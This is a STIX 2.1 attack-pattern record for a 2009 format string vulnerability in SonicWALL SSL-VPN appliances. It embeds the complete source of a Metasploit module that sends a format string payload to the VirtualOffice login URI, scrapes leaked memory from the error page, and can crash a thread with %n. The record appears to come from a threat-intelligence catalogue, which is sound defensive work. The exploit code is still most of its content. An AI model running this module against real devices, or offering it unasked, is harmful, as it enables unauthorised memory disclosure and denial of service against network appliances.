{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6e27a9b2-133f-4f50-afab-16a5a48023f8",
    "created": "2024-08-14T16:26:24.467742Z",
    "modified": "2024-08-14T16:26:24.467746Z",
    "name": "SonicWALL SSL-VPN Format String Vulnerability",
    "description": " There is a format string vulnerability within the SonicWALL SSL-VPN Appliance - 200, 2000 and 4000 series. Arbitrary memory can be read or written to, depending on the format string used. There appears to be a length limit of 127 characters of format string data. With physical access to the device and debugging this module may be able to be used to execute arbitrary code remotely. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/http/sonicwall_ssl_format.rb",
            "external_id": "sonicwall_ssl_format.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.aushack.com/200905-sonicwall.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Dos # %n etc kills a thread, but otherwise ok.\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'SonicWALL SSL-VPN Format String Vulnerability',\n      'Description'    => %q{\n        There is a format string vulnerability within the SonicWALL\n        SSL-VPN Appliance - 200, 2000 and 4000 series. Arbitrary memory\n        can be read or written to, depending on the format string used.\n        There appears to be a length limit of 127 characters of format\n        string data. With physical access to the device and debugging,\n        this module may be able to be used to execute arbitrary code remotely.\n      },\n      'Author'         => [ 'aushack' ],\n      'License'        => MSF_LICENSE,\n      'References'     => [\n        [ 'BID', '35145' ],\n        #[ 'CVE', '' ], # no CVE?\n        [ 'OSVDB', '54881' ],\n        [ 'URL', 'http://www.aushack.com/200905-sonicwall.txt' ],\n      ],\n      'DisclosureDate' => '2009-05-29'))\n\n    register_options([\n      OptString.new('URI', [ true, 'URI to request', '/cgi-bin/welcome/VirtualOffice?err=' ]),\n      OptString.new('FORMAT', [ true, 'Format string (i.e. %x, %s, %n, %p etc)', '%x%x%x%x%x%x%x' ]),\n      Opt::RPORT(443),\n      OptBool.new('SSL', [true, 'Use SSL', true]),\n    ])\n  end\n\n  def run\n    if (datastore['FORMAT'].length > 125) # Max length is 127 bytes\n      print_error(\"FORMAT string length cannot exceed 125 bytes.\")\n      return\n    end\n\n    fmt = datastore['FORMAT'] + \"XX\"  # XX is 2 bytes used to mark end of memory garbage for regexp\n    begin\n      res = send_request_raw({\n        'uri' => normalize_uri(datastore['URI']) + fmt,\n      })\n\n      if res and res.code == 200\n        res.body.scan(/\\<td class\\=\\\"loginError\\\"\\>(.+)XX/ism)\n        print_status(\"Information leaked: #{$1}\")\n      end\n\n      print_status(\"Request sent to #{rhost}:#{rport}\")\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      print_status(\"Couldn't connect to #{rhost}:#{rport}\")\n    rescue ::Timeout::Error, ::Errno::EPIPE\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-05-29"
}